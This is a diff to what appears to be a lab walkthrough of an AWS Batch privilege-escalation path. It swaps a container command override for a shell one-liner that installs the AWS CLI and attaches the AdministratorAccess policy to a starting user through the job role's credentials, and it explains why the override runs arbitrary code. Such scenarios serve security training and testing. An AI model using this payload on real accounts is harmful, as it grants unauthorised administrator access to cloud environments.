@@ -64,9 +64,8 @@ The attack is a single `batch:SubmitJob` call with `--container-overrides` repla
 cat > /tmp/overrides.json <<'EOF'
 {
   "command": [
-    "iam", "attach-user-policy",
-    "--user-name", "pl-prod-batch-002-to-admin-starting-user",
-    "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+    "sh", "-c",
+    "pip install --quiet awscli && aws iam attach-user-policy --user-name pl-prod-batch-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
   ],
   "environment": [
     {"name": "AWS_DEFAULT_REGION", "value": "<your-region>"}
@@ -75,7 +74,7 @@ cat > /tmp/overrides.json <<'EOF'
 EOF
 ```
 
-This tells Batch to ignore whatever command was baked into the job definition and instead run `aws iam attach-user-policy`. The container image (`amazon/aws-cli`) is still used — it just runs your command instead of the original one.
+This tells Batch to ignore whatever command was baked into the job definition and instead run your shell one-liner. The job definition runs `python:3.11-slim`, a generic data-processing image with no custom `ENTRYPOINT`, so `ContainerOverrides.Command` fully replaces execution — your command runs as arbitrary shell code with the container's (admin) job role credentials. Because `python:3.11-slim` ships neither the `aws` CLI nor `curl`, the payload first `pip install`s the aws CLI, then attaches `AdministratorAccess`.
 
 Now submit the job:
 
